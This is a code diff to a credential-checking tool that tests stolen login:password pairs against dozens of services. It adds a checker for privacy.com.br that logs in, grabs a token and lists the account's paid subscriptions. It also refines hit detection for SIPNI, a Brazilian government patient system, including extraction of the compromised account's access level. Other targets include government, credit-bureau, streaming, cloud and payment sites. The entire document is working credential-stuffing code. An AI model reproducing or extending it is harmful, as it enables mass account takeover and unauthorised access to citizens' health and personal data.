@@ -92,7 +92,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot" | "hetzner" | "roblox" | "epicgames" | "steam" | "playstation" | "xbox" | "paypal" | "cpf";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot" | "hetzner" | "roblox" | "epicgames" | "steam" | "playstation" | "xbox" | "paypal" | "cpf" | "privacy";
 
 export interface CheckResult {
   credential: string;
@@ -1033,18 +1033,21 @@ async function checkSipni(login: string, password: string): Promise<CheckResult>
       : null;
 
     if (!redirectUrl) {
-      // No redirect in XML — might still be an inline failure
+      // No redirect in XML — login was rejected
       const xml2Low = xml2.toLowerCase();
+      if (xml2Low.includes("usu") && (xml2Low.includes("ou senha inv") || xml2Low.includes("senha incorreta"))) {
+        return { credential, login, status: "FAIL", detail: "senha_invalida_step3" };
+      }
       if (xml2Low.includes("inicio.jsf") || xml2Low.includes("type=\"password\"") || xml2Low.includes("j_idt23:senha")) {
         return { credential, login, status: "FAIL", detail: "no_redirect_still_on_login" };
       }
-      // Ambiguous — fall through to pacientes check
+      // No redirect at all = definitely failed — don't fall through
+      return { credential, login, status: "FAIL", detail: "no_redirect_ajax2" };
     }
 
-    // ── Step 4: Verify access via pacientes page ──────────────────────────────
-    // If we got a redirect URL that's not the login page, follow it
-    // Then hit the pacientes URL to confirm session
-    const targetUrl = redirectUrl && !redirectUrl.includes("inicio.jsf") ? redirectUrl : SIPNI_PACIENTES;
+    // ── Step 4: Follow redirect and verify active session ────────────────────
+    // redirectUrl is present and not the login page → follow it
+    const targetUrl = redirectUrl.includes("inicio.jsf") ? SIPNI_PACIENTES : redirectUrl;
     let finalResult: CurlResult;
     try {
       finalResult = await runCurl([
@@ -1059,20 +1062,36 @@ async function checkSipni(login: string, password: string): Promise<CheckResult>
       return { credential, login, status: "ERROR", detail: `FINAL_GET_ERROR:${String(e)}` };
     }
 
-    const finalText = finalResult.body.toLowerCase();
+    const finalBody = finalResult.body;
+    const finalText = finalBody.toLowerCase();
+
+    // Extract "Nível" (access level) from authenticated page — e.g. "Nacional", "Estadual", "Municipal"
+    function extractNivel(html: string): string {
+      const m = html.match(/N[íi]vel:\s*<[^>]*>([^<]{1,40})/i)
+             ?? html.match(/N[íi]vel:[^<]{0,5}<[^>]*>([^<]{1,40})/i)
+             ?? html.match(/N[íi]vel:\s*([A-Za-zÀ-ÿ ]{2,30})/i);
+      return m ? m[1].trim() : "";
+    }
 
     // LIVE markers
     const liveMarkers = ["pacienteform", "pesquisa de paciente", "listapacientetable",
-                         "nenhum paciente encontrado", "cartão sus", "cadastrar paciente"];
+                         "nenhum paciente encontrado", "cartão sus", "cadastrar paciente",
+                         "sipni/tabelas.update", "pni.datasus.gov.br/sipni", "nível:"];
     for (const m of liveMarkers) {
-      if (finalText.includes(m)) {
-        return { credential, login, status: "HIT", detail: "sipni_dashboard" };
+      if (finalText.includes(m.toLowerCase())) {
+        const nivel = extractNivel(finalBody);
+        return { credential, login, status: "HIT", detail: nivel ? `nivel:${nivel}` : "sipni_dashboard" };
       }
     }
 
-    // Heuristic: page is large and doesn't look like the login screen → likely a valid session
-    if (finalResult.body.length > 5000 && !finalText.includes("type=\"password\"") && !finalText.includes("inicio.jsf")) {
-      return { credential, login, status: "HIT", detail: "large_page_no_login_form" };
+    // Conservative heuristic: large page with no login form markers AND at least one authenticated keyword
+    // (only fires if no explicit live marker was found above)
+    const authKeywords = ["bem-vindo", "logout", "sair", "cadastrar", "pesquisar", "menu"];
+    const hasAuthKw    = authKeywords.some(k => finalText.includes(k));
+    const hasLoginForm = finalText.includes("type=\"password\"") || finalText.includes("inicio.jsf") || finalText.includes("j_idt23:senha");
+    if (finalBody.length > 8000 && hasAuthKw && !hasLoginForm) {
+      const nivel = extractNivel(finalBody);
+      return { credential, login, status: "HIT", detail: nivel ? `nivel:${nivel}` : "authenticated_dashboard" };
     }
 
     // DIE markers
@@ -1094,6 +1113,106 @@ async function checkSipni(login: string, password: string): Promise<CheckResult>
   } finally {
     try { unlinkSync(cookieFile); } catch { /**/ }
   }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  PRIVACY.COM.BR CHECKER — https://service.privacy.com.br
+//  Logic: POST JSON login (supports CPF or email) → extract token → fetch subscriptions
+//  CPF format: digits only (document field), email format: @ present (email field)
+// ═══════════════════════════════════════════════════════════════════════════════
+const PRIVACY_AUTH_URL = "https://service.privacy.com.br/auth/login";
+const PRIVACY_SUBS_URL = "https://service.privacy.com.br/profile/UserFollowing?page=0&limit=30&nickName=";
+const PRIVACY_TIMEOUT  = 20_000;
+const PRIVACY_UA       = `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36`;
+
+async function checkPrivacy(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+
+  // Detect if login is CPF (digits) or email
+  const isCpf   = /^\d+$/.test(login.trim());
+  const bodyObj  = isCpf
+    ? { Email: null, Document: login, Password: password, Locale: "pt-BR", CanReceiveEmail: false }
+    : { Email: login, Document: null, Password: password, Locale: "pt-BR", CanReceiveEmail: false };
+
+  // Step 1: authenticate
+  let authText: string;
+  try {
+    const authResult = await runCurl([
+      "-s", "--compressed",
+      "-X", "POST",
+      "-H", `User-Agent: ${PRIVACY_UA}`,
+      "-H", "accept: application/json, text/plain, */*",
+      "-H", "accept-language: pt-BR",
+      "-H", "content-type: application/json",
+      "-H", "origin: https://privacy.com.br",
+      "-H", "referer: https://privacy.com.br/",
+      "-d", JSON.stringify(bodyObj),
+      PRIVACY_AUTH_URL,
+    ], PRIVACY_TIMEOUT);
+    authText = authResult.body.trim();
+    if (!authText) return { credential, login, status: "ERROR", detail: "EMPTY_RESPONSE" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `AUTH_ERROR:${String(e).slice(0, 80)}` };
+  }
+
+  // Cloudflare block
+  if (authText.includes("error code: 1015") || authText.includes("Ray ID")) {
+    return { credential, login, status: "ERROR", detail: "CF_BLOCKED" };
+  }
+
+  let authJson: Record<string, unknown>;
+  try { authJson = JSON.parse(authText); } catch {
+    return { credential, login, status: "ERROR", detail: `INVALID_JSON:${authText.slice(0, 60)}` };
+  }
+
+  // FAIL: wrong credentials
+  const errorKey = String(authJson.errorKey ?? authJson.error ?? "").trim();
+  if (!authJson.token && (errorKey || authJson.statusCode === 401 || authJson.statusCode === 400)) {
+    return { credential, login, status: "FAIL", detail: errorKey || "wrong_credentials" };
+  }
+
+  const token = String(authJson.token ?? "").trim();
+  if (!token) {
+    return { credential, login, status: "FAIL", detail: `no_token:${authText.slice(0, 80)}` };
+  }
+
+  // Step 2: fetch subscriptions / followed profiles
+  let subsText: string;
+  try {
+    const subsResult = await runCurl([
+      "-s", "--compressed",
+      "-H", `User-Agent: ${PRIVACY_UA}`,
+      "-H", "accept: application/json, text/plain, */*",
+      "-H", `authorization: Bearer ${token}`,
+      "-H", "origin: https://privacy.com.br",
+      "-H", "referer: https://privacy.com.br/",
+      PRIVACY_SUBS_URL,
+    ], PRIVACY_TIMEOUT);
+    subsText = subsResult.body.trim();
+  } catch {
+    // Subscriptions endpoint failed — still a valid login
+    return { credential, login, status: "HIT", detail: "authenticated_no_subs" };
+  }
+
+  let subsArr: unknown[];
+  try { subsArr = JSON.parse(subsText); } catch { subsArr = []; }
+  if (!Array.isArray(subsArr) || subsArr.length === 0) {
+    return { credential, login, status: "HIT", detail: "sem_assinaturas" };
+  }
+
+  const subs = subsArr
+    .map((s: unknown) => {
+      if (typeof s !== "object" || !s) return null;
+      const item = s as Record<string, unknown>;
+      const name = String(item.profileName ?? item.nickName ?? "?").trim();
+      const free = item.isFree === true;
+      return `${name}[${free ? "Free" : "Pago"}]`;
+    })
+    .filter(Boolean)
+    .slice(0, 10)
+    .join(", ");
+
+  return { credential, login, status: "HIT", detail: `subs:${subs}` };
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -4808,6 +4927,8 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   hetzner:       5,   // REST API key — very fast
   // Governo BR — CPF lookup
   cpf:           3,   // Receita Federal public lookup — moderate
+  // Financeiro BR
+  privacy:       3,   // privacy.com.br — REST API, moderate
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -4858,6 +4979,8 @@ function resolveChecker(target: CheckerTarget) {
     case "hetzner":       return checkHetzner;
     // Governo BR — CPF/CNPJ via Receita Federal
     case "cpf":           return checkReceita;
+    // Financeiro BR
+    case "privacy":       return checkPrivacy;
     default:              return checkIseek;
   }
 }
@@ -5112,7 +5235,7 @@ async function runCheckerJobAsync(
   finish();
 }
 
-const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot", "hetzner", "roblox", "epicgames", "steam", "playstation", "xbox", "paypal", "cpf"];
+const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot", "hetzner", "roblox", "epicgames", "steam", "playstation", "xbox", "paypal", "cpf", "privacy"];
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 // POST /api/checker/check
